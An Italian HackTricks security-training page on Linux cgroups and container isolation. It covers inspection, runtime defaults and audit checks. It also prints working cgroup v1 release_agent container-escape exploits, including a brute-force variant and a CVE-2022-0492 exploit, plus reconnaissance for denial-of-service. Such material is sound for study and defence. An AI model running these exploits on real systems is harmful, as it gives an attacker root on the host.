# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

I **control groups** di Linux sono il meccanismo del kernel utilizzato per raggruppare i processi ai fini della contabilizzazione, della limitazione, della definizione delle priorità e dell'applicazione delle policy. Se i namespace riguardano principalmente l'isolamento della visualizzazione delle risorse, i cgroups riguardano principalmente la gestione di **quanto** di tali risorse un insieme di processi può consumare e, in alcuni casi, **con quali classi di risorse** può interagire. I container dipendono costantemente dai cgroups, anche quando l'utente non li osserva direttamente, perché quasi ogni runtime moderno ha bisogno di un modo per dire al kernel: "questi processi appartengono a questo workload e queste sono le regole sulle risorse che si applicano loro".

Per questo i container engine inseriscono ogni nuovo container nel proprio sottoalbero cgroup. Una volta che l'albero dei processi si trova lì, il runtime può limitare la memoria, limitare il numero di PID, assegnare un peso all'utilizzo della CPU, regolare l'I/O e limitare l'accesso ai device. In un ambiente di produzione, questo è essenziale sia per la sicurezza multi-tenant sia per una semplice igiene operativa. Un container privo di controlli significativi sulle risorse potrebbe esaurire la memoria, inondare il sistema di processi oppure monopolizzare CPU e I/O in modi che rendono instabili l'host o i workload vicini.

Dal punto di vista della sicurezza, i cgroups sono importanti per due motivi distinti. Primo, limiti sulle risorse errati o assenti consentono semplici attacchi di denial-of-service. Secondo, alcune funzionalità dei cgroups, soprattutto nelle configurazioni meno recenti di **cgroup v1**, hanno storicamente creato potenti primitive di breakout quando erano scrivibili dall'interno di un container.

## v1 Vs v2

Esistono due principali modelli di cgroup utilizzati. **cgroup v1** espone più gerarchie di controller, e i vecchi exploit writeup ruotano spesso attorno alle semantiche insolite e talvolta eccessivamente potenti disponibili in quel modello. **cgroup v2** introduce una gerarchia più unificata e, in generale, un comportamento più pulito. Le distribuzioni moderne preferiscono sempre più cgroup v2, ma esistono ancora ambienti misti o legacy; ciò significa che entrambi i modelli sono ancora rilevanti durante la revisione di sistemi reali.

La differenza è importante perché alcune delle più note storie di container breakout, come gli abusi di **`release_agent`** in cgroup v1, sono legate in modo molto specifico al comportamento dei vecchi cgroup. Un lettore che vede un cgroup exploit su un blog e poi lo applica ciecamente a un sistema moderno che usa solo cgroup v2 rischia di fraintendere ciò che è effettivamente possibile sul target.

## Ispezione

Il modo più rapido per vedere dove si trova la shell corrente è:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Il file `/proc/self/cgroup` mostra i percorsi dei cgroup associati al processo corrente. Su un host moderno con cgroup v2, vedrai spesso una voce unified. Su host meno recenti o ibridi, potresti vedere più percorsi dei controller v1. Una volta individuato il percorso, puoi esaminare i file corrispondenti in `/sys/fs/cgroup` per visualizzare i limiti e l'utilizzo corrente.

Su un host con cgroup v2, sono utili i seguenti comandi:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Questi file rivelano quali controller esistono e quali sono delegati ai cgroup figlio. Questo modello di delega è importante negli ambienti rootless e gestiti da systemd, dove il runtime potrebbe essere in grado di controllare solo il sottoinsieme delle funzionalità dei cgroup che la gerarchia padre delega effettivamente.

## Laboratorio

Un modo per osservare i cgroup nella pratica consiste nell'eseguire un container con memoria limitata:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Puoi anche provare un container con PID limitati:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Questi esempi sono utili perché aiutano a collegare il runtime flag all'interfaccia dei file del kernel. Il runtime non applica la regola per magia; scrive le impostazioni cgroup rilevanti e poi lascia che sia il kernel ad applicarle all'albero dei processi.

## Utilizzo del runtime

Docker, Podman, containerd e CRI-O si basano tutti sui cgroup come parte del normale funzionamento. Le differenze di solito non riguardano il fatto che utilizzino o meno i cgroup, ma **quali valori predefiniti scelgono**, **come interagiscono con systemd**, **come funziona la delega rootless** e **quanta parte della configurazione è controllata a livello di engine rispetto al livello di orchestrazione**.

In Kubernetes, le richieste e i limiti delle risorse diventano infine configurazione cgroup sul nodo. Il percorso dal Pod YAML all'applicazione da parte del kernel passa attraverso kubelet, il runtime CRI e il runtime OCI, ma i cgroup rimangono il meccanismo del kernel che applica effettivamente la regola. Negli ambienti Incus/LXC, i cgroup sono anch'essi ampiamente utilizzati, soprattutto perché i system container spesso espongono un albero dei processi più ricco e prevedono modalità operative più simili a quelle delle VM.

## Misconfigurazioni e Breakout

La situazione classica nella sicurezza dei cgroup è il meccanismo **`release_agent` scrivibile di cgroup v1**. In questo modello, se un attacker poteva scrivere nei file cgroup corretti, abilitare `notify_on_release` e controllare il percorso memorizzato in `release_agent`, il kernel poteva finire per eseguire un percorso scelto dall'attacker nei namespace iniziali sull'host quando il cgroup diventava vuoto. Per questo i writeup più vecchi dedicano così tanta attenzione alla possibilità di scrittura dei controller cgroup, alle opzioni di mount e alle condizioni relative a namespace/capability.

Anche quando `release_agent` non è disponibile, gli errori nella configurazione dei cgroup sono comunque importanti. Un accesso ai device eccessivamente ampio può rendere i device dell'host raggiungibili dal container. L'assenza di limiti per memoria e PID può trasformare una semplice code execution in un DoS dell'host. Una delega cgroup debole negli scenari rootless può inoltre indurre i defender a presumere che esista una restrizione, quando in realtà il runtime non è mai stato in grado di applicarla.

### Contesto di `release_agent`

La tecnica `release_agent` si applica solo a **cgroup v1**. L'idea di base è che, quando l'ultimo processo in un cgroup termina e `notify_on_release=1` è impostato, il kernel esegue il programma il cui percorso è memorizzato in `release_agent`. L'esecuzione avviene nei **namespace iniziali dell'host**, ed è questo che trasforma un `release_agent` scrivibile in una primitiva di container escape.

Affinché la tecnica funzioni, l'attacker generalmente necessita di:

- una gerarchia **cgroup v1** scrivibile
- la possibilità di creare o utilizzare un child cgroup
- la possibilità di impostare `notify_on_release`
- la possibilità di scrivere un percorso in `release_agent`
- un percorso che dal punto di vista dell'host risolva a un eseguibile

### PoC classico

Il PoC storico in una riga è:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Questa PoC scrive un percorso del payload in `release_agent`, attiva il rilascio del cgroup e quindi legge il file di output generato sull'host.

### Procedura dettagliata e comprensibile

La stessa idea è più facile da comprendere se suddivisa in passaggi.

1. Crea e prepara un cgroup scrivibile:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifica il percorso dell'host che corrisponde al filesystem del container:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Rilascia un payload che sarà visibile dal percorso dell'host:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Attiva l'esecuzione rendendo vuoto il cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
L'effetto è l'esecuzione del payload sul lato host con privilegi root dell'host. In un exploit reale, il payload solitamente scrive un proof file, avvia una reverse shell o modifica lo stato dell'host.

### Variante con percorso relativo tramite `/proc/<pid>/root`

In alcuni ambienti, il percorso dell'host al filesystem del container non è ovvio oppure è nascosto dallo storage driver. In tal caso, il percorso del payload può essere espresso tramite `/proc/<pid>/root/...`, dove `<pid>` è un PID dell'host appartenente a un processo nel container corrente. Questo è il principio alla base della variante brute-force con percorso relativo:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Il trucco rilevante qui non è il brute force in sé, ma la forma del percorso: `/proc/<pid>/root/...` consente al kernel di risolvere un file all'interno del filesystem del container dallo host namespace, anche quando il percorso di storage diretto sull'host non è noto in anticipo.

### Variante CVE-2022-0492

Nel 2022, CVE-2022-0492 ha mostrato che la scrittura su `release_agent` in cgroup v1 non verificava correttamente `CAP_SYS_ADMIN` nell'**initial user namespace**. Ciò rendeva la tecnica molto più accessibile sui kernel vulnerabili, perché un processo del container in grado di montare una gerarchia cgroup poteva scrivere su `release_agent` senza essere già privilegiato nell'host user namespace.

Exploit minimo:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Su un kernel vulnerabile, l'host esegue `/proc/self/exe` con i privilegi di root dell'host.

Per uno sfruttamento pratico, inizia verificando se l'ambiente espone ancora percorsi cgroup-v1 scrivibili o un accesso pericoloso ai device:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Se `release_agent` è presente e scrivibile, sei già in territorio di legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Se il percorso del cgroup non consente di effettuare un escape, il successivo utilizzo pratico consiste spesso in un denial of service o nella reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Questi comandi indicano rapidamente se il workload ha spazio sufficiente per eseguire un fork-bomb, consumare memoria in modo aggressivo o abusare di un'interfaccia cgroup legacy scrivibile.

## Controlli

Quando si esamina un target, lo scopo dei controlli sui cgroup è capire quale modello di cgroup è in uso, se il container vede percorsi dei controller scrivibili e se primitive di breakout obsolete come `release_agent` siano effettivamente rilevanti.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Cosa è interessante qui:

- Se `mount | grep cgroup` mostra **cgroup v1**, i vecchi writeup sui breakout diventano più rilevanti.
- Se `release_agent` esiste ed è raggiungibile, vale subito la pena di svolgere un'indagine più approfondita.
- Se la gerarchia cgroup visibile è scrivibile e il container dispone anche di capabilities forti, l'ambiente merita una revisione molto più attenta.

Se scopri **cgroup v1**, mount dei controller scrivibili e un container che dispone anche di capabilities forti o di protezioni seccomp/AppArmor deboli, questa combinazione merita particolare attenzione. I cgroup sono spesso considerati un argomento noioso di gestione delle risorse, ma storicamente hanno fatto parte di alcune delle più istruttive catene di container escape proprio perché il confine tra "controllo delle risorse" e "influenza sull'host" non era sempre così netto come si presumeva.

## Default del Runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita | I container vengono inseriti automaticamente nei cgroup; i limiti delle risorse sono opzionali, a meno che non vengano impostati con dei flag | omettere `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Abilitato per impostazione predefinita | `--cgroups=enabled` è l'impostazione predefinita; il namespace cgroup predefinito varia in base alla versione del cgroup (`private` su cgroup v2, `host` su alcune configurazioni cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, accesso ai device meno restrittivo, `--privileged` |
| Kubernetes | Abilitato tramite il runtime per impostazione predefinita | I pod e i container vengono inseriti nei cgroup dal runtime del nodo; il controllo granulare delle risorse dipende da `resources.requests` / `resources.limits` | omettere le richieste/i limiti delle risorse, accesso privilegiato ai device, configurazione errata del runtime a livello di host |
| containerd / CRI-O | Abilitato per impostazione predefinita | I cgroup fanno parte della normale gestione del ciclo di vita | configurazioni dirette del runtime che allentano i controlli sui device o espongono interfacce legacy cgroup v1 scrivibili |

La distinzione importante è che **l'esistenza dei cgroup** è solitamente predefinita, mentre i **vincoli utili sulle risorse** sono spesso opzionali, a meno che non vengano configurati esplicitamente.
{{#include ../../../../banners/hacktricks-training.md}}
